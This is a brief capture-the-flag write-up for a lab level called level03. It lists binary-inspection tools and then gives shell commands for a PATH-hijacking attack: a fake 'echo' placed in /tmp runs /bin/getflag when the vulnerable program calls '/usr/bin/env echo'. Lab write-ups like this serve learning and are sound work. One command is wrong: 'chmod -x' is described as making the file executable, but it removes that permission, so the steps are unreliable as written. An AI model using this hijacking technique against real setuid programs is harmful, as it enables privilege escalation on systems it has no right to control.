# In level03 directory, there is an executable file named 'level03'. When I ran it, it showed 'exploit me'. When I was learning how to exploit an executable, I discovered many commands:

-> file {file} will display infos about it.

-> ltrace {exe} will show library calls.

-> strace {exe} will show sys calls and signals.

-> hexdump {exe} will display the content in ASCII, decimal, hexadecimal, or octal.

-> strings {file} will display the strings of printable characters in files.

-> objdump -d {exe} will show a disassembled version of the executable.

-> gdb {exe} is a debugger.

# I took a long look inside the code with gdb. Tried to retrieve the value of the registers. But I couldn't fin anything, except: To display 'Exploit me' the program uses a call /usr/bin/env echo. The solution is there, I must pass him a fake echo which will contain the command 'getflag'.
# I have rights in /tmp directory.

$> echo /bin/getflag > /tmp/echo
$> chmod -x /tmp/echo <- make it executable
$> export PATH=/tmp:$PATH <- change the path to find the executable

# And There you go !
